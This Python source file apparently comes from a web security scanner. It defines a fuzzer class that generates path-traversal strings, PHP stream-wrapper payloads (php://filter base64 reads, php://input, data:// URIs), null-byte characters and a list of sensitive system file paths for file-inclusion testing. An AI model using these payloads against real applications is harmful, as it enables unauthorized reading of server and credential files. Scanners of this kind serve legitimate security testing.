#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer
from saker.utils.paths import Paths


class SFile(Fuzzer):

    """sensitive File"""

    generalports = [20, 21, 80]
    phpext = ['php', 'php2', 'php3', 'php4', 'php5', 'php6', 'php7', 'pht', 'phtml', 'shtml']
    phpwrappers = ['file', 'http', 'ftp', 'php', 'zlib', 'data', 'glob', 'phar']

    def __init__(self):
        super(SFile, self).__init__()
        # windows max dir length
        self.winmax = 259
        # linux max dir length
        self.linuxmax = 4096

    @staticmethod
    def traverse(cnt=5, path="../"):
        return path * cnt

    @staticmethod
    def fakeProtocol(type, msg=""):
        if type == "php":
            return "php://input"
        elif type == "phpb64":
            return "php://filter/convert.base64-encode/resource=" + msg
        elif type == "textb64":
            return "data://text/plain;base64," + msg.encode("base64")
        elif type == "text":
            return "data://text/plain," + msg
        elif type == "zip":
            return ["zip://", "bzip2://", "zlib://"][0] + msg

    @staticmethod
    def specialChar():
        return [
            ":",
            ".",
            ";",
            "\x00",
            "\x01",
            "\\",
        ]

    @staticmethod
    def list(userpath=""):
        ret = []
        with open(Paths.linuxfile) as pathes:
            for p in pathes:
                if p == "\n":
                    continue
                if userpath != "":
                    p = p.replace("~", userpath)
                ret.append(p.strip("\n"))
        return ret
